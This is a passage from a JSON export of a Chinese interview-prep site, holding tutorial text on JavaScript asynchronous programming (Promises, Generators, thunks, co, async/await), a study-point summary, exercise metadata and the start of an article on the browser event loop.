0) return resolve([])\n    let remaining = args.length\n    function res(i, val) {\n      try {\n        if (val && (typeof val === 'object' || typeof val === 'function')) {\n          let then = val.then\n          if (typeof then === 'function') {\n            then.call(val, function (val) { // 这里如果传入参数是 promise的话需要将结果传入 args, 而不是 promise实例\n              res(i, val) \n            }, reject)\n            return\n          }\n        }\n        args[i] = val\n        if (--remaining === 0) {\n          resolve(args)\n        }\n      } catch (ex) {\n        reject(ex)\n      }\n    }\n    for (let i = 0; i < args.length; i++) {\n      res(i, args[i])\n    }\n  })\n}\n```\n\n#### （4）Promise.race\n\n该方法的参数是 Promise 实例数组, 然后其 then 注册的回调方法是数组中的某一个 Promise 的状态变为 fulfilled 的时候就执行. 因为 Promise 的状态**只能改变一次**, 那么我们只需要把 Promise.race 中产生的 Promise 对象的 resolve 方法, 注入到数组中的每一个 Promise 实例中的回调函数中即可：\n\n```javascript\noPromise.race = function (args) {\n  return new oPromise((resolve, reject) => {\n    for (let i = 0, len = args.length; i < len; i++) {\n      args[i].then(resolve, reject)\n    }\n  })\n}\n```\n\n## 四、Generator\n\n### 1\\. Generator 概述\n\n#### （1）Generator\n\nGenerator（生成器）是 ES6 中的关键词，通俗来讲 Generator 是一个带星号的函数（它并不是真正的函数），可以配合 yield 关键字来暂停或者执行函数。先来看一个例子：\n\n```javascript\nfunction* gen() {\n  console.log(\"enter\");\n  let a = yield 1;\n  let b = yield (function () {return 2})();\n  return 3;\n}\nvar g = gen()           // 阻塞，不会执行任何语句\nconsole.log(typeof g)   // 返回 object 这里不是 \"function\"\nconsole.log(g.next())\nconsole.log(g.next())\nconsole.log(g.next())\nconsole.log(g.next()) \n```\n\n输出结果如下：\n\n```javascript\nobject\nenter\n{ value: 1, done: false }\n{ value: 2, done: false }\n{ value: 3, done: true }\n{ value: undefined, done: true }\n```\n\nGenerator 中配合使用 yield 关键词可以控制函数执行的顺序，每当执行一次 next 方法，Generator 函数会执行到下一个存在 yield 关键词的位置。\n\n总结，Generator 的执行的关键点如下：\n\n-   调用 gen() 后，程序会阻塞，不会执行任何语句；\n-   调用 g.next() 后，程序继续执行，直到遇到 yield 关键词时执行暂停；\n-   一直执行 next 方法，最后返回一个对象，其存在两个属性：value 和 done。\n\n#### （2）yield\n\nyield 同样也是 ES6 的关键词，配合 Generator 执行以及暂停。yield 关键词最后返回一个迭代器对象，该对象有 value 和 done 两个属性，其中 done 属性代表返回值以及是否完成。yield 配合着 Generator，再同时使用 next 方法，可以主动控制 Generator 执行进度。\n\n下面来看看多个 Generator 配合 yield 使用的情况：\n\n```javascript\nfunction* gen1() {\n    yield 1;\n    yield* gen2();\n    yield 4;\n}\nfunction* gen2() {\n    yield 2;\n    yield 3;\n}\nvar g = gen1();\nconsole.log(g.next())\nconsole.log(g.next())\nconsole.log(g.next())\nconsole.log(g.next())\n```\n\n执行结果如下：\n\n```javascript\n{ value: 1, done: false }\n{ value: 2, done: false }\n{ value: 3, done: false }\n{ value: 4, done: false }\n{value: undefined, done: true}\n```\n\n可以看到，使用 yield 关键词的话还可以配合着 Generator 函数嵌套使用，从而控制函数执行进度。这样对于 Generator 的使用，以及最终函数的执行进度都可以很好地控制，从而形成符合你设想的执行顺序。即便 Generator 函数相互嵌套，也能通过调用 next 方法来按照进度一步步执行。\n\n#### （3）生成器原理\n\n其实，在生成器内部，如果遇到 yield 关键字，那么 V8 引擎将返回关键字后面的内容给外部，并暂停该生成器函数的执行。生成器暂停执行后，外部的代码便开始执行，外部代码如果想要恢复生成器的执行，可以使用 result.next 方法。\n\n那 V8 是怎么实现生成器函数的暂停执行和恢复执行的呢？\n\n它用到的就是**协程**，协程是—种比线程更加轻量级的存在。我们可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程。比如，当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行; 同样，也可以从 B 协程中启动 A 协程。通常，如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程。\n\n正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。每一时刻，该线程只能执行其中某一个协程。最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。\n\n### 2\\. Generator 和 thunk 结合\n\n下面先来了解一下什么是 thunk 函数，以判断数据类型为例：\n\n```javascript\nlet isString = (obj) => {\n  return Object.prototype.toString.call(obj) === '[object String]';\n};\nlet isFunction = (obj) => {\n  return Object.prototype.toString.call(obj) === '[object Function]';\n};\nlet isArray = (obj) => {\n  return Object.prototype.toString.call(obj) === '[object Array]';\n};\n....\n```\n\n可以看到，这里出现了很多重复的判断逻辑，平常在开发中类似的重复逻辑的场景也同样会有很多。下面来进行封装：\n\n```javascript\nlet isType = (type) => {\n  return (obj) => {\n    return Object.prototype.toString.call(obj) === `[object ${type}]`;\n  }\n}\n```\n\n封装之后就可以这样使用，从而来减少重复的逻辑代码：\n\n```javascript\nlet isString = isType('String');\nlet isArray = isType('Array');\nisString(\"123\");    // true\nisArray([1,2,3]);   // true\n```\n\n相应的 isString 和 isArray 是由 isType 方法生产出来的函数，通过上面的方式来改造代码，明显简洁了不少。像 isType 这样的函数称为 thunk 函数，它的**基本思路都是接收一定的参数，会生产出定制化的函数，最后使用定制化的函数去完成想要实现的功能。**\n\n这样的函数在 JS 的编程过程中会遇到很多，抽象度比较高的 JS 代码往往都会采用这样的方式。那 Generator 和 thunk 函数的结合是否能带来一定的便捷性呢？\n\n下面以文件操作的代码为例，看一下 Generator 和 thunk 的结合能够对异步操作产生的效果：\n\n```javascript\nconst readFileThunk = (filename) => {\n  return (callback) => {\n    fs.readFile(filename, callback);\n  }\n}\nconst gen = function* () {\n  const data1 = yield readFileThunk('1.txt')\n  console.log(data1.toString())\n  const data2 = yield readFileThunk('2.txt')\n  console.log(data2.toString)\n}\nlet g = gen();\ng.next().value((err, data1) => {\n  g.next(data1).value((err, data2) => {\n    g.next(data2);\n  })\n})\n```\n\nreadFileThunk 就是一个 thunk 函数，上面的这种编程方式就让 Generator 和异步操作关联起来了。上面第三段代码执行起来嵌套的情况还算简单，如果任务多起来，就会产生很多层的嵌套，可读性不强，因此有必要把执行的代码进行封装优化：\n\n```javascript\nfunction run(gen){\n  const next = (err, data) => {\n    let res = gen.next(data);\n    if(res.done) return;\n    res.value(next);\n  }\n  next();\n}\nrun(g);\n```\n\n可以看到， run 函数和上面的执行效果其实是一样的。代码虽然只有几行，但其包含了递归的过程，解决了多层嵌套的问题，并且完成了异步操作的一次性的执行效果。这就是通过 thunk 函数完成异步操作的情况。\n\n### 3\\. Generator 和 Promise 结合\n\n其实 Promise 也可以和 Generator 配合来实现上面的效果。还是利用上面的输出文件的例子，对代码进行改造，如下所示：\n\n```javascript\nconst readFilePromise = (filename) => {\n  return new Promise((resolve, reject) => {\n    fs.readFile(filename, (err, data) => {\n      if(err) {\n        reject(err);\n      }else {\n        resolve(data);\n      }\n    })\n  }).then(res => res);\n}\n// 这块和上面 thunk 的方式一样\nconst gen = function* () {\n  const data1 = yield readFilePromise('1.txt')\n  console.log(data1.toString())\n  const data2 = yield readFilePromise('2.txt')\n  console.log(data2.toString)\n}\n// 这里和上面 thunk 的方式一样\nfunction run(gen){\n  const next = (err, data) => {\n    let res = gen.next(data);\n    if(res.done) return;\n    res.value(next);\n  }\n  next();\n}\nrun(g);\n```\n\n可以看到，thunk 函数的方式和通过 Promise 方式执行效果本质上是一样的，只不过通过 Promise 的方式也可以配合 Generator 函数实现同样的异步操作。\n\n### 4\\. co 函数库\n\nco 函数库用于处理 Generator 函数的自动执行。核心原理其实就是通过和 thunk 函数以及 Promise 对象进行配合，包装成一个库。它使用起来非常简单，比如还是用上面那段代码，第三段代码就可以省略了，直接引用 co 函数，包装起来就可以使用了，代码如下：\n\n```javascript\nconst co = require('co');\nlet g = gen();\nco(g).then(res =>{\n  console.log(res);\n})\n```\n\n这段代码比较简单，几行就完成了之前写的递归的那些操作。那么为什么 co 函数库可以自动执行 Generator 函数，它的处理原理如下：\n\n1.  因为 Generator 函数就是一个异步操作的容器，它需要一种自动执行机制，co 函数接受 Generator 函数作为参数，并最后返回一个 Promise 对象。\n2.  在返回的 Promise 对象里面，co 先检查参数 gen 是否为 Generator 函数。如果是，就执行该函数；如果不是就返回，并将 Promise 对象的状态改为 resolved。\n3.  co 将 Generator 函数的内部指针对象的 next 方法，包装成 onFulfilled 函数。这主要是为了能够捕捉抛出的错误。\n4.  关键的是 next 函数，它会反复调用自身。\n\n## 五、Async/Await\n\n### 1\\. async/await 的概念\n\nES7 新增了两个关键字： async和await，代表异步JavaScript编程范式的迁移。它改进了生成器的缺点，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力。其实 async/await 是 Generator 的语法糖，它能实现的效果都能用then链来实现，它是为优化then链而开发出来的。\n\n从字面上来看，async是“异步”的简写，await则为等待，所以 async 用来声明异步函数，这个关键字可以用在函数声明、函数表达式、箭头函数和方法上。因为异步函数主要针对不会马上完成的任务，所以自然需要一种暂停和恢复执行的能力，使用await关键字可以暂停异步代码的执行，等待Promise解决。async 关键字可以让函数具有异步特征，但总体上代码仍然是同步求值的。\n\n它们的用法很简单，首先用 async 关键字声明一个异步函数：\n\n```javascript\nasync function httpRequest() {\n}\n```\n\n然后就可以在这个函数内部使用 await 关键字了：\n\n```javascript\nasync function httpRequest() {\n  let res1 = await httpPromise(url1)\n  console.log(res1)\n}\n```\n\n这里，await关键字会接收一个期约并将其转化为一个返回值或一个抛出的异常。通过情况下，我们不会使用await来接收一个保存期约的变量，更多的是把他放在一个会返回期约的函数调用面前，比如上述例子。这里的关键就是，await关键字并不会导致程序阻塞，代码仍然是异步的，而await只是掩盖了这个事实，这就意味着任何使用await的代码本身都是异步的。\n\n下面来看看async函数返回了什么：\n\n```javascript\nasync function testAsy(){\n   return 'hello world';\n}\nlet result = testAsy(); \nconsole.log(result)\n```\n\n![image.png](https://static.ecool.fun//article/1152bc5f-4ecd-4861-95b3-afb73ade272e.jpeg) 可以看到，async 函数返回的是 Promise 对象。如果异步函数使用return关键字返回了值（如果没有return则会返回undefined），这个值则会被 `Promise.resolve()` 包装成 Promise 对象。异步函数始终返回Promise对象。\n\n### 2\\. await 到底在等啥？\n\n**那await到底在等待什么呢？**\n\n一般我们认为 await 是在等待一个 async 函数完成。不过按语法说明，await 等待的是一个表达式，这个表达式的结果是 Promise 对象或其它值。\n\n因为 async 函数返回一个 Promise 对象，所以 await 可以用于等待一个 async 函数的返回值——这也可以说是 await 在等 async 函数。但要清楚，它等的实际是一个返回值。注意，await 不仅用于等 Promise 对象，它可以等任意表达式的结果。所以，await 后面实际是可以接普通函数调用或者直接量的。所以下面这个示例完全可以正确运行：\n\n```javascript\nfunction getSomething() {\n    return \"something\";\n}\nasync function testAsync() {\n    return Promise.resolve(\"hello async\");\n}\nasync function test() {\n    const v1 = await getSomething();\n    const v2 = await testAsync();\n    console.log(v1, v2);\n}\ntest(); // something hello async\n```\n\nawait 表达式的运算结果取决于它等的是什么：\n\n-   如果它等到的不是一个 Promise 对象，那 await 表达式的运算结果就是它等到的内容；\n-   如果它等到的是一个 Promise 对象，await 就就会阻塞后面的代码，等着 Promise 对象 resolve，然后将得到的值作为 await 表达式的运算结果。\n\n下面来看一个例子：\n\n```javascript\nfunction testAsy(x){\n   return new Promise(resolve=>{setTimeout(() => {\n       resolve(x);\n     }, 3000)\n    }\n   )\n}\nasync function testAwt(){    \n  let result =  await testAsy('hello world');\n  console.log(result);    // 3秒钟之后出现hello world\n  console.log('cuger')   // 3秒钟之后出现cug\n}\ntestAwt();\nconsole.log('cug')  //立即输出cug\n```\n\n这就是 await 必须用在 async 函数中的原因。async 函数调用不会造成阻塞，它内部所有的阻塞都被封装在一个 Promise 对象中异步执行。await暂停当前async的执行，所以'cug''最先输出，hello world'和 cuger 是3秒钟后同时出现的。\n\n### 3\\. async/await的优势\n\n单一的 Promise 链并不能凸显 async/await 的优势。但是，如果处理流程比较复杂，那么整段代码将充斥着 then，语义化不明显，代码不能很好地表示执行流程，这时async/await的优势就能体现出来了。\n\n假设一个业务，分多个步骤完成，每个步骤都是异步的，而且依赖于上一个步骤的结果。首先用 `setTimeout` 来模拟异步操作：\n\n```javascript\n/**\n * 传入参数 n，表示这个函数执行的时间（毫秒）\n * 执行的结果是 n + 200，这个值将用于下一步骤\n */\nfunction takeLongTime(n) {\n    return new Promise(resolve => {\n        setTimeout(() => resolve(n + 200), n);\n    });\n}\nfunction step1(n) {\n    console.log(`step1 with ${n}`);\n    return takeLongTime(n);\n}\nfunction step2(n) {\n    console.log(`step2 with ${n}`);\n    return takeLongTime(n);\n}\nfunction step3(n) {\n    console.log(`step3 with ${n}`);\n    return takeLongTime(n);\n}\n```\n\n现在用 Promise 方式来实现这三个步骤的处理：\n\n```javascript\nfunction doIt() {\n    console.time(\"doIt\");\n    const time1 = 300;\n    step1(time1)\n        .then(time2 => step2(time2))\n        .then(time3 => step3(time3))\n        .then(result => {\n            console.log(`result is ${result}`);\n            console.timeEnd(\"doIt\");\n        });\n}\ndoIt();\n// c:\\var\\test>node --harmony_async_await .\n// step1 with 300\n// step2 with 500\n// step3 with 700\n// result is 900\n// doIt: 1507.251ms\n```\n\n输出结果 `result` 是 `step3()` 的参数 `700 + 200` = `900`。`doIt()` 顺序执行了三个步骤，一共用了 `300 + 500 + 700 = 1500` 毫秒，和 `console.time()/console.timeEnd()` 计算的结果一致。\n\n如果用 async/await 来实现呢，会是这样：\n\n```javascript\nasync function doIt() {\n    console.time(\"doIt\");\n    const time1 = 300;\n    const time2 = await step1(time1);\n    const time3 = await step2(time2);\n    const result = await step3(time3);\n    console.log(`result is ${result}`);\n    console.timeEnd(\"doIt\");\n}\ndoIt();\n```\n\n结果和之前的 Promise 实现是一样的，但是这个代码看起来会清晰得多，几乎和同步代码一样。\n\nasync/await对比Promise的优势就显而易见了：\n\n-   代码读起来更加同步，Promise虽然摆脱了回调地狱，但是then的链式调⽤也会带来额外的理解负担；\n-   Promise传递中间值很麻烦，⽽async/await⼏乎是同步的写法，⾮常优雅；\n-   错误处理友好，async/await可以⽤成熟的try/catch，Promise的错误捕获比较冗余；\n-   调试友好，Promise的调试很差，由于没有代码块，不能在⼀个返回表达式的箭头函数中设置断点，如果在⼀个.then代码块中使⽤调试器的步进(step-over)功能，调试器并不会进⼊后续的.then代码块，因为调试器只能跟踪同步代码的每⼀步。\n\n### 4\\. async/await 的异常处理\n\n利用 async/await 的语法糖，可以像处理同步代码的异常一样，来处理异步代码，这里还用上面的示例：\n\n```javascript\nconst exe = (flag) => () => new Promise((resolve, reject) => {\n    console.log(flag);\n    setTimeout(() => {\n        flag ? resolve(\"yes\") : reject(\"no\");\n    }, 1000);\n});\n```\n\n```javascript\nconst run = async () => {\n\ttry {\n\t\tawait exe(false)();\n\t\tawait exe(true)();\n\t} catch (e) {\n\t\tconsole.log(e);\n\t}\n}\nrun();\n```\n\n这里定义一个异步方法 run，由于 await 后面需要直接跟 Promise 对象，因此通过额外的一个方法调用符号 () 把原有的 exe 方法内部的 Thunk 包装拆掉，即执行 exe(false)() 或 exe(true)() 返回的就是 Promise 对象。在 try 块之后，使用 catch 来捕捉。运行代码会得到这样的输出：\n\n```javascript\nfalse\nno\n```\n\n这个 false 就是 exe 方法对入参的输出，而这个 no 就是 setTimeout 方法 reject 的回调返回，它通过异常捕获并最终在 catch 块中输出。就像我们所认识的同步代码一样，第四行的 exe(true) 并未得到执行。",
    "testPoint": "### 1. **异步编程的概念**\n   - **定义**：异步编程允许程序在等待某个操作完成的同时继续执行其他任务，避免阻塞主线程。\n   - **事件循环**：了解 JavaScript 的事件循环机制，如何处理异步任务。\n\n### 2. **回调函数**\n   - **基本使用**：使用回调函数来处理异步操作的结果。\n   - **示例**：\n     ```javascript\n     function fetchData(callback) {\n         setTimeout(() => {\n             callback('Data received');\n         }, 1000);\n     }\n     fetchData((data) => {\n         console.log(data); // \"Data received\"\n     });\n     ```\n   - **问题**：回调地狱（callback hell）和可读性下降。\n\n### 3. **Promise**\n   - **定义**：Promise 是一种用于处理异步操作的对象，代表一个可能在未来某个时间点完成或失败的操作。\n   - **状态**：Promise 有三种状态：pending（待定）、fulfilled（已完成）、rejected（已拒绝）。\n   - **示例**：\n     ```javascript\n     const promise = new Promise((resolve, reject) => {\n         setTimeout(() => {\n             resolve('Data received');\n         }, 1000);\n     });\n     promise.then((data) => {\n         console.log(data); // \"Data received\"\n     });\n     ```\n   - **链式调用**：使用 `.then()` 和 `.catch()` 方法链式处理结果和错误。\n\n### 4. **async/await**\n   - **定义**：`async/await` 是基于 Promise 的语法糖，使异步代码看起来像同步代码。\n   - **使用方式**：使用 `async` 关键字定义异步函数，使用 `await` 等待 Promise 的结果。\n   - **示例**：\n     ```javascript\n     async function fetchData() {\n         const response = await new Promise((resolve) => {\n             setTimeout(() => {\n                 resolve('Data received');\n             }, 1000);\n         });\n         console.log(response); // \"Data received\"\n     }\n     fetchData();\n     ```\n   - **错误处理**：使用 `try...catch` 处理异步函数中的错误。\n\n### 5. **错误处理**\n   - **Promise 的错误处理**：了解如何使用 `.catch()` 方法捕获 Promise 中的错误。\n   - **async/await 中的错误处理**：使用 `try...catch` 语句处理异步函数中的错误。\n\n### 6. **并发与串行**\n   - **并发处理**：如何同时发起多个异步操作，并等待所有操作完成。\n   - **示例**：\n     ```javascript\n     const promise1 = fetchData();\n     const promise2 = fetchData();\n     Promise.all([promise1, promise2]).then((results) => {\n         console.log(results); // [\"Data received\", \"Data received\"]\n     });\n     ```\n   - **串行处理**：如何按顺序执行异步操作，确保一个操作完成后再开始下一个。\n   - **示例**：\n     ```javascript\n     async function serialFetch() {\n         const data1 = await fetchData();\n         const data2 = await fetchData();\n         console.log(data1, data2);\n     }\n     serialFetch();\n     ```\n\n### 7. **异步迭代**\n   - **for...of 和 `async/await` 结合**：使用 `for...of` 循环处理异步数组。\n   - **示例**：\n     ```javascript\n     async function processArray(array) {\n         for (const item of array) {\n             const result = await fetchData(item);\n             console.log(result);\n         }\n     }\n     ```\n\n### 8. **性能优化**\n   - **避免过多的并发请求**：了解如何限制同时进行的异步请求数量，以避免超载。\n   - **示例**：使用 `p-limit` 库来控制并发。\n\n### 9. **请求和响应**\n   - **AJAX 和 Fetch API**：如何使用 AJAX 或 Fetch API 进行网络请求，以及处理异步响应。\n   - **示例**：\n     ```javascript\n     fetch('https://api.example.com/data')\n         .then(response => response.json())\n         .then(data => console.log(data))\n         .catch(error => console.error('Error:', error));\n     ```\n\n### 10. **Web API 和异步编程**\n   - **理解**：浏览器的 Web API（如定时器、DOM 事件、网络请求等）如何与异步编程配合使用。\n\n### 11. **异步编程的陷阱**\n   - **状态管理**：处理异步操作时的状态管理问题，如何确保数据一致性。\n   - **时间复杂性**：在处理复杂的异步操作时，注意执行时间和回调的复杂性。\n",
    "exerciseKeyList": "[\"1bdd3e29-f9b2-4f1d-a8b2-6a8b14320779\",\"d17cf190-40d8-4405-bc82-eb54480ca38c\",\"1e753e43-2b36-405f-8267-f00afc7656c1\",\"f72409bc-ca63-4891-8443-c68f48ff37e9\",\"696a79c6-1e6d-4e66-ad11-2e072c9c62d7\",\"462ff8a8-29ba-4e49-88ad-d60e7b3f4ee8\",\"584f7b53-5e4b-48b9-ad7b-ae4789647ada\",\"59d7f771-83c9-4e85-a9a6-f348e6a547c9\",\"36be973b-0351-4a18-b6b8-5e68023e7b96\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 12,
    "createAt": "2024-10-01T12:32:36.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1bdd3e29-f9b2-4f1d-a8b2-6a8b14320779",
        "title": "Promise 构造函数是同步执行还是异步执行，那么 then 方法呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:41:58.000Z"
      },
      {
        "exerciseKey": "1e753e43-2b36-405f-8267-f00afc7656c1",
        "title": "遍历一个任意长度的list中的元素并依次创建异步任务，如何获取所有任务的执行结果？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:47:08.000Z",
        "updateAt": "2024-07-20T17:43:03.000Z"
      },
      {
        "exerciseKey": "36be973b-0351-4a18-b6b8-5e68023e7b96",
        "title": "setState 是同步，还是异步的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:08:16.000Z",
        "updateAt": "2024-08-10T17:05:02.000Z"
      },
      {
        "exerciseKey": "462ff8a8-29ba-4e49-88ad-d60e7b3f4ee8",
        "title": "使用Promise实现：限制异步操作的并发个数，并尽可能快的完成全部",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:31:28.000Z",
        "updateAt": "2025-07-18T02:20:36.000Z"
      },
      {
        "exerciseKey": "584f7b53-5e4b-48b9-ad7b-ae4789647ada",
        "title": "使用Promise封装一个异步加载图片的方法",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-09T15:28:57.000Z",
        "updateAt": "2022-01-09T23:31:46.000Z"
      },
      {
        "exerciseKey": "59d7f771-83c9-4e85-a9a6-f348e6a547c9",
        "title": "异步编程有哪些实现方式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:35:43.000Z",
        "updateAt": "2024-08-10T17:06:01.000Z"
      },
      {
        "exerciseKey": "696a79c6-1e6d-4e66-ad11-2e072c9c62d7",
        "title": "什么是同步和异步？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:41:35.000Z",
        "updateAt": "2024-08-10T17:06:53.000Z"
      },
      {
        "exerciseKey": "d17cf190-40d8-4405-bc82-eb54480ca38c",
        "title": "try...catch 可以捕获到异步代码中的错误吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-02-01T07:30:51.000Z",
        "updateAt": "2024-08-10T17:07:39.000Z"
      },
      {
        "exerciseKey": "f72409bc-ca63-4891-8443-c68f48ff37e9",
        "title": "如何顺序执行10个异步任务？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:46:47.000Z",
        "updateAt": "2024-08-10T17:06:56.000Z"
      }
    ]
  },
  "18": {
    "id": 18,
    "tagId": 10,
    "title": "事件循环",
    "explanation": "## 单线程的 JavaScript\n\n### 同步与异步\n\nJavaScript 在设计之初是作为**浏览器脚本语言**，主要用于与用户进行**页面交互**和**操纵 DOM**。因此，为避免由不可预测的用户操作可能带来的复杂的并发问题，JavaScript 只能设计成**单线程**的，这也是这门语言的核心特征之一。\n\n> JS 的宿主环境通过仅提供一个线程运行 JS 来保证 JS 代码的单线程运行。\n\n单线程意味着 JS 引擎在同一时间只能做一件事情，即**同步**地执行代码。但在代码执行过程中不可避免地会遇到一些**无法立即执行**的任务，例如：\n\n-   计时器到达时间后要执行的任务 --- `setInterval`、`setTimeout`\n-   网络请求完成后要执行的任务 --- `XMLHttpRequest`、`Fetch`\n-   监听到用户操作后要执行的任务 --- `addEventListener`\n-   ... ... ...\n\n如果让执行 JS 的线程去处理这些任务，就会导致该线程处于**长期阻塞**的状态，而宿主环境中的 JS 执行线程往往还承担着极其重要的工作。例如，在浏览器中，如果执行 JS 的线程长期阻塞，就会导致浏览器卡死！\n\n为避免上述情况发生，JS 的宿主环境使用了**异步**的方式来处理这种无法立即执行的任务。\n\n当遇到异步任务时，宿主环境会将其交给**其他线程**处理，执行 JS 的线程则会立即结束当前任务转而去执行后续代码。\n\n### 事件循环\n\n事件循环是宿主环境处理 JS 异步操作，让其能够**非阻塞式运行**的机制。\n\n不同宿主环境对事件循环的实现方式有所不同，不过在核心机制上大同小异。\n\n接下来，本文将详细描述 JavaScript 在**浏览器**和 **Node.js** 这两个宿主环境中的事件循环机制。\n\n## 浏览器事件循环\n\n### 浅谈浏览器\n\n聊浏览器的事件循环之前，我们先说说浏览器本身。\n\n现代浏览器是一个**多进程多线程**的应用程序，内部工作极其复杂，其程度直逼操作系统。它拥有数个功能模块，为避免单个模块崩溃牵连其他模块，导致连锁反应，使浏览器彻底崩溃。浏览器在启动时，会开启多个进程，把不同的功能模块放在**不同的进程**里。\n\n![谷歌浏览器架构.png](https://static.ecool.fun//article/67eb4efc-94a7-4ddb-a638-a21bb80629bd.jpeg)\n\n浏览器进程众多，其中比较**重要**的有：\n\n📚 浏览器进程\n\n浏览器进程是浏览器的**主进程**，无论打开多少浏览器窗口，它仅有**一个**。\n\n它主要负责浏览器**界面显示**、**用户交互**和**进程管理**。\n\n> 这里说的界面和交互，不是视窗内的网站界面。而是指浏览器本身自带的部分，如导航栏、书签栏、刷新按钮等。\n\n刚打开浏览器的时候只有一个浏览器进程，其他进程都是它创建的。\n\n📚 网络进程\n\n网络进程主要负责处理网站的**数据请求和响应**，通常情况下，它与**渲染进程**的交互最为密切。每当网站需要进行资源请求，渲染进程就会将任务交给网络进程处理，网络进程取得响应结果后再返回给渲染进程。\n\n网络进程内部会开启多个线程，以实现**多网络请求**的**异步化处理**。\n\n📚 渲染进程\n\n渲染进程负责控制和显示**视窗**部分（网站页面）的所有内容，主要是解析 HTML、CSS、JS 和其他资源，并生成渲染树、执行布局和绘制等操作。\n\n在现代浏览器中，默认会为**每个标签页**创建一个渲染进程。  \n出于安全考虑，渲染进程运行在**沙箱模式**下，无法访问系统资源。\n\n> 通常可以通过浏览器的 _更多工具_ -> _任务管理器_ 查看当前浏览器开启的所有进程及资源消耗情况。\n\n![浏览器任务管理器.png](https://static.ecool.fun//article/d6b1e140-468c-4dfd-a905-cc6c7f13873b.jpeg)\n\n### 浏览器中的 Event Loop\n\n渲染进程启动后，会开启一个**渲染主线程**，它是浏览器中**最繁忙**的线程，需要它处理的任务包括但不限于：\n\n-   解析 HTML、CSS\n-   计算样式、布局\n-   处理图层、绘制页面\n-   执行 JS、执行各种回调函数\n-   ... ... ...\n\n![渲染主线程.png](https://static.ecool.fun//article/8360773d-1add-46e2-b596-83cd9353b181.jpeg)\n\n渲染主线程一个线程要处理好这么多任务，那如何进行**任务调度**便成了重点，而浏览器采用的则是**排队**机制。\n\n浏览器会提供一个**先进先出**的**消息队列**（也称任务队列），用于存储待执行的任务。渲染主线程不断依次从消息队列中拿出任务执行，遇到异步操作则扔给**其他线程**处理，响应结果**再次加入**消息队列等待渲染主线程拿取。如此，所有的任务都能有条不紊地进行，而这个过程便是**事件循环**（也称消息循环）。\n\n💎 事件循环具体过程如下：\n\n1.  从谷歌浏览器源码来看，渲染进程进入渲染流程，渲染主线程便会开启一个**无限循环**。\n2.  每次循环都会检查消息队列中是否有任务。\n    -   _如果有_，就拿出队列中的**第一个**任务执行，执行过程中若遇到**异步操作**，渲染主线程会将其加入其他线程的任务队列进行处理，它自己则不会等待，转而去执行后续代码\n    -   _如果没有_，则进入**休眠状态**\n3.  当其他线程把异步任务处理完成，就会**将后续的回调操作包装成新任务**，加入消息队列末尾，等待渲染主线程拿取执行。\n4.  其他所有线程，包括**其他进程**的线程，都可以往消息队列末尾添加任务。当新任务添加时如果主线程处于休眠状态，则会将其**唤醒**以继续循环拿取任务执行。\n\n![浏览器事件循环2.png](https://static.ecool.fun//article/d735a13d-5993-4e97-b494-f65e4878d4a2.jpeg)\n\n任务在消息队列里先进先出并没有优先级，而浏览器中消息队列**不止一条**，它们是有优先级的，过去我们把消息队列分为**宏队列**和**微队列**。\n\n宏队列排队**宏任务**（DOM 操作回调、定时器回调、UI 绘制等），微队列排队**微任务**（Promise 回调、...）。渲染主线程的每次循环会**优先**执行并清空微队列任务，再执行宏队列。\n\n不过随着时间推移，浏览器复杂度急剧提升，仅两个队列已经不能满足现代浏览器的需求了。于是，W3C 在制定 [HTML 规范](https://html.spec.whatwg.org/multipage/webappapis.html#event-loops \"https://html.spec.whatwg.org/multipage/webappapis.html#event-loops\")的时候已抛弃宏队列的说法。\n\n各浏览器厂商在实现事件循环的时候会根据最新的解释：_每个任务都有其任务类型，同一个类型的任务必须在同一个队列里排队。在一次事件循环中，浏览器可根据实际情况从不同的队列中取出任务执行。并且浏览器必须准备好一个微队列，其中的任务优先于所有其他队列的任务执行_。\n\n不同浏览器，除微队列外，队列的种类和数量均可能不同，这取决于浏览器厂商。  \n在目前的 Chrome 的实现中，至少包含了下面几个队列：\n\n-   微队列：用于存放需要最快执行的任务，优先级极高，将任务加入微队列的方式有 `promise.then()` 、`MutationObserver`\n-   交互队列：用于存放用户操作后产生的事件处理任务，优先级次于微队列\n-   延迟队列：用于存放定时器到达后的回调任务，优先级次于交互队列\n\n> 需要特别值得注意的是，人工合成的事件派发，即直接写在代码里的 `dom.click()` 或 `dispatchEvent()`，相对于浏览器而言并不是真正的用户交互，会被当作同步任务执行。\n> \n> 只有用户动作触发的事件，才会作为异步任务，在事件循环中等待执行。\n> \n> [MDN 参考](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/dispatchEvent \"https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/dispatchEvent\")\n\n下面我们通过一个具体案例，说明浏览器事件循环的过程：\n\n```js\n    // 写出下述程序的输出结果\n    const btn = document.getElementById('button');\n    function test() {\n        console.log('function test!');\n        Promise.resolve().then(() => {\n            console.log('promise1');\n        });\n    }\n    \n    setTimeout(() => {\n        console.log('set timer');\n        Promise.resolve().then(test);\n    }, 0);\n    \n    btn.onclick = () => {\n        console.log('click button');\n    };\n    \n    btn.click();\n    \n    Promise.resolve().then(() => {\n        console.log('promise2');\n    });\n    \n    console.log('script start');\n    \n    // 输出结果依次为：\n    // click button\n    // script start\n    // promise2\n    // set timer\n    // function test!\n 